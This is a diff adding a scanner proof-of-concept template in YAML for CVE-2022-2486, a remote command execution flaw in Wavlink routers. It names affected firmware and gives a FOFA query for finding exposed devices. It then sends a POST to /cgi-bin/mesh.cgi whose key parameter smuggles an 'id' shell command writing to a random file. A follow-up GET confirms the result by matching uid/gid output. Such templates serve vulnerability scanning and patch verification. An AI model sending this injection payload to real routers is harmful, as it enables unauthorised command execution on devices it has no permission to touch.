@@ -1,0 +1,26 @@
+id: poc-yaml-wavlink-meshcgi-rce
+info:
+  name: Wavlink路由器远程命令执行漏洞(CVE-2022-2486)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2022-2486
+  finger: wl-wn535k3_firmware,wl-wn535k2_firmware,wl-wn535k2,wl-wn535k3
+  fofa: title="Wi-Fi APP Login"
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /cgi-bin/mesh.cgi?page=upgrade&key=%27;id%3E%3E{{.filename}}.txt'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: page=night_led&start_hour=;;
+  expression: 'status_code == 500
+
+    '
+- method: GET
+  path: /cgi-bin/{{.filename}}.txt
+  expression: "status_code == 200 && \nmatches(body,`uid=\\d+\\(.*?\\)\\s+gid=\\d+\\\
+    (.*?\\)`)\n"
+transport: http
